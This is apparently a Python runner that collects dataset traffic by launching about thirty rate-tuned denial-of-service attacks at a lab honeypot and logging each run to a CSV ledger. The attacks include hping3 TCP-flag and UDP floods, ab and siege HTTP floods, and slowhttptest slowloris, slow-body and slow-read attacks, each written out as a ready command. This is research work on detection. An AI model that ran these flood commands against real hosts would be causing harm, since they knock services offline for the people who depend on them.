#!/usr/bin/env python3
# DoS collection runner  (class: denial_of_service, PREFIX "D")  -- v3 (post full-trial fixes)
# Mirrors run_postexploit.py for ledger schema / resume / batch-window.
#
# Changes after the 30-run trial exposed three environment issues:
#   1. REMOVED nping — under WSL2 it stamps its own source IP (192.168.248.147, the
#      WSL2-internal addr) with a fixed source port, so its traffic never arrives as
#      SRC and is invisible to the src_ip filter (D019/D022 = 0, D009/D010 garbage).
#      hping3 is used for ALL L4 floods — it arrives correctly as 192.168.32.1 with
#      ephemeral source ports.
#   2. REMOVED ICMP floods — packets reach the host (echo-replied) but p0f is TCP-only
#      and this Suricata does not log ICMP under a queryable src_ip, so they yield ~0
#      capturable events (D020/D021/D022). Not a viable class member in this honeypot.
#   3. PER-RUN DRAIN — half-open TCP floods (SYN/ACK/FIN/XMAS/RST) create "no session"
#      flows that Suricata logs at timeout (~60-110s later). With a 30s drain those bled
#      into the NEXT run's window (D011's whole signal landed in D012). So TCP-flag
#      floods now drain 150s (their flows log in-window); UDP/L7 flows log promptly -> 45-60s.
#
# DESIGN (unchanged): NO source-IP spoofing (arrives as SRC), rate-controlled floods,
# one/few dest ports (concentration separates from scan).
#
# RUN AS ROOT (hping3 needs raw sockets):  sudo python3 run_dos.py
# TRIAL: MAX_RUNS = 3 -> D001/D002/D003 are three ADJACENT SYN floods on different ports,
#        so the re-verify can confirm the long drain killed the cross-run bleed.

import csv, os, subprocess, time, resource
from datetime import datetime, timezone

LEDGER  = "/mnt/c/tpot-project/01-run-ledger/run-ledger.csv"
LOG_DIR = "/mnt/c/tpot-project/02-raw-data/attack-logs"
TARGET  = "192.168.32.138"
SRC     = "192.168.32.1"
LABEL   = "denial_of_service"
PREFIX  = "D"
COOLDOWN = 30          # dead gap between runs (no traffic) so ingestion settles
MAX_RUNS = None           # trial lever: 3 -> three adjacent SYN floods (bleed check)

# per-run drain tiers (seconds, folded INTO the run window):
L4   = 150             # TCP no-session floods: flows log at ~60-110s timeout
UDP  = 45              # UDP flows log promptly
L7   = 45              # ab/siege connections close promptly
SLOW = 60              # slow-DoS held connections close a bit later

COLUMNS = ["run_id","attack_type_label","tool","exact_command","target_ip",
           "target_port","start_time_utc","end_time_utc","expected_honeypot",
           "src_ip_seen","notes"]

def utc_now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def rows_done():
    if not os.path.exists(LEDGER): return 0
    n = 0
    for r in csv.DictReader(open(LEDGER, newline="")):
        if r["run_id"].startswith(PREFIX) and r["run_id"][1:].isdigit(): n += 1
    return n

def sequences():
    T = TARGET
    def hp(*a):  return ["hping3", *a, T]        # raw sockets -> needs root
    def slow(*a):return ["slowhttptest", *a]
    # (argv, note, target_port, expected_honeypot, timeout_sec, drain_sec)
    return [
        # ---- first 3 = adjacent SYN floods, different ports -> re-verify bleed is gone ----
        (hp("-S","-p","80","-i","u200","-c","40000"),  "SYN flood :80 high-rate",  "80",  "Suricata/Snare",     120, L4),
        (hp("-S","-p","22","-i","u500","-c","20000"),   "SYN flood :22 med-rate",   "22",  "Suricata/Cowrie",    120, L4),
        (hp("-S","-p","445","-i","u500","-c","20000"),  "SYN flood :445 med-rate",  "445", "Suricata/Dionaea",   120, L4),

        # ---- remaining SYN floods (hping3; the ex-nping :23/:1433 now via hping3) ----
        (hp("-S","-p","3306","-i","u1000","-c","10000"),"SYN flood :3306 low-rate", "3306","Suricata/Dionaea",   120, L4),
        (hp("-S","-p","5555","-i","u200","-c","40000"), "SYN flood :5555 high-rate","5555","Suricata/Honeytrap", 120, L4),
        (hp("-S","-p","3389","-i","u500","-c","20000"), "SYN flood :3389 med-rate", "3389","Suricata/RDPhoneypot",120, L4),
        (hp("-S","-p","23","-i","u500","-c","20000"),   "SYN flood :23 med-rate",   "23",  "Suricata/Cowrie",    120, L4),
        (hp("-S","-p","1433","-i","u300","-c","30000"), "SYN flood :1433 high-rate","1433","Suricata/Dionaea",   120, L4),
        (hp("-S","-p","8080","-i","u500","-c","20000"), "SYN flood :8080 med-rate", "8080","Suricata/Wordpot",   120, L4),

        # ---- other TCP flag floods ----
        (hp("-A","-p","80","-i","u300","-c","30000"),        "ACK flood :80",   "80",  "Suricata", 120, L4),
        (hp("-F","-p","22","-i","u500","-c","20000"),        "FIN flood :22",   "22",  "Suricata", 120, L4),
        (hp("-F","-P","-U","-p","80","-i","u500","-c","20000"),"XMAS flood :80", "80",  "Suricata", 120, L4),
        (hp("-R","-p","3306","-i","u500","-c","20000"),      "RST flood :3306", "3306","Suricata", 120, L4),

        # ---- UDP floods (flows log promptly -> short drain); vary port + payload ----
        (hp("--udp","-p","5060","-d","100","-i","u300","-c","30000"),"UDP flood :5060 d100","5060","Suricata/Honeytrap",120, UDP),
        (hp("--udp","-p","53","-d","512","-i","u300","-c","30000"),  "UDP flood :53 d512",  "53",  "Suricata",          120, UDP),
        (hp("--udp","-p","1883","-d","64","-i","u500","-c","20000"), "UDP flood :1883 d64", "1883","Suricata/Honeytrap",120, UDP),
        (hp("--udp","-p","161","-d","256","-i","u300","-c","30000"), "UDP flood :161 d256", "161", "Suricata",          120, UDP),
        (hp("--udp","-p","123","-d","200","-i","u300","-c","30000"), "UDP flood :123 d200", "123", "Suricata",          120, UDP),
        (hp("--udp","-p","500","-d","300","-i","u400","-c","25000"), "UDP flood :500 d300", "500", "Suricata",          120, UDP),

        # ---- HTTP GET floods (L7, full connections, same path, TIME-bounded) ----
        (["ab","-t","30","-c","200","-s","30", f"http://{T}:80/"],        "HTTP GET flood ab :80 t30 c200","80",  "Snare/Tanner",90,  L7),
        (["ab","-t","30","-c","150","-s","30", f"http://{T}:8080/"],      "HTTP GET flood ab :8080 t30",   "8080","Wordpot",     90,  L7),
        (["ab","-t","45","-c","300","-s","30", f"http://{T}:80/index.php"],"HTTP GET flood ab :80 heavy",  "80",  "Snare/Tanner",120, L7),
        (["siege","-b","-c","150","-t","30S", f"http://{T}:80/"],         "HTTP flood siege :80 c150",     "80",  "Snare/Tanner",120, L7),
        (["siege","-b","-c","100","-t","30S", f"http://{T}:8080/"],       "HTTP flood siege :8080 c100",   "8080","Wordpot",     120, L7),
        (["siege","-b","-c","200","-t","40S", f"http://{T}:80/?flood=1"], "HTTP flood siege :80 param",    "80",  "Snare/Tanner",120, L7),

        # ---- slow-DoS (low-and-slow; many held connections) ----
        (slow("-c","1500","-H","-i","10","-r","100","-t","GET","-u",f"http://{T}:80/","-x","24","-p","3","-l","120"),
                                                             "slowloris :80 c1500",  "80",  "Snare/Tanner",180, SLOW),
        (slow("-c","1500","-B","-i","10","-r","100","-t","POST","-u",f"http://{T}:80/","-x","24","-p","3","-l","120"),
                                                             "slow-body :80 c1500",  "80",  "Snare/Tanner",180, SLOW),
        (slow("-c","1200","-X","-r","80","-u",f"http://{T}:80/","-l","120"),
                                                             "slow-read :80 c1200",  "80",  "Snare/Tanner",180, SLOW),
        (slow("-c","1500","-H","-i","10","-r","100","-t","GET","-u",f"http://{T}:8080/","-x","24","-p","3","-l","120"),
                                                             "slowloris :8080 c1500","8080","Wordpot",     180, SLOW),
        (slow("-c","1500","-B","-i","10","-r","100","-t","POST","-u",f"http://{T}:8080/","-x","24","-p","3","-l","120"),
                                                             "slow-body :8080 c1500","8080","Wordpot",     180, SLOW),
    ]

def main():
    try:
        _, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        resource.setrlimit(resource.RLIMIT_NOFILE, (min(65535, hard), hard))
    except Exception as e:
        print("warn: could not raise RLIMIT_NOFILE:", e)

    os.makedirs(os.path.dirname(LEDGER), exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)
    new  = not os.path.exists(LEDGER)
    seqs = sequences()
    done = rows_done()
    todo = seqs[done:][:MAX_RUNS] if MAX_RUNS is not None else seqs[done:]
    if not todo:
        print("Nothing to run — ledger already has all DoS runs."); return

    with open(LEDGER, "a", newline="") as f:
        w = csv.DictWriter(f, fieldnames=COLUMNS)
        if new: w.writeheader()
        idx = done + 1
        first_start = last_end = None
        for argv, note, port, hp_exp, tmo, drain in todo:
            rid = f"{PREFIX}{idx:03d}"; idx += 1
            tool = os.path.basename(argv[0])
            print(f"[{rid}] {note}  ({tool})  [drain {drain}s]")
            start = utc_now(); first_start = first_start or start
            try:
                res = subprocess.run(argv, capture_output=True, text=True, timeout=tmo)
                out = (res.stdout or "") + "\n---STDERR---\n" + (res.stderr or "")
            except subprocess.TimeoutExpired as e:
                so = e.stdout.decode() if isinstance(e.stdout, bytes) else (e.stdout or "")
                out = so + "\nTOOL TIMEOUT (expected for time-bounded floods)"
            except FileNotFoundError:
                out = f"TOOL NOT FOUND: {argv[0]}"
            time.sleep(drain)                       # late flow events land in-window
            end = utc_now(); last_end = end

            lines = out.splitlines()
            if len(lines) > 200:
                out = "\n".join(lines[:80] + [f"... [{len(lines)-160} lines truncated] ..."] + lines[-80:])
            transcript = (f"# {rid} {note}\n# tool: {tool}\n# cmd: {' '.join(argv)}\n"
                          f"# target_port: {port}  expected_honeypot: {hp_exp}  drain: {drain}s\n\n# tool output:\n" + out)
            open(f"{LOG_DIR}/{rid}.txt", "w").write(transcript)

            w.writerow({"run_id":rid,"attack_type_label":LABEL,"tool":tool,
                        "exact_command":" ".join(argv),"target_ip":TARGET,
                        "target_port":port,"start_time_utc":start,"end_time_utc":end,
                        "expected_honeypot":hp_exp,"src_ip_seen":SRC,
                        "notes":f"{note} | flood+drain{drain}s"})
            f.flush()
            print(f"       {start} -> {end}   (drain {drain}s, cooldown {COOLDOWN}s)\n")
            time.sleep(COOLDOWN)
    print(f"Batch window (UTC): {first_start} -> {last_end}")

if __name__ == "__main__":
    main()
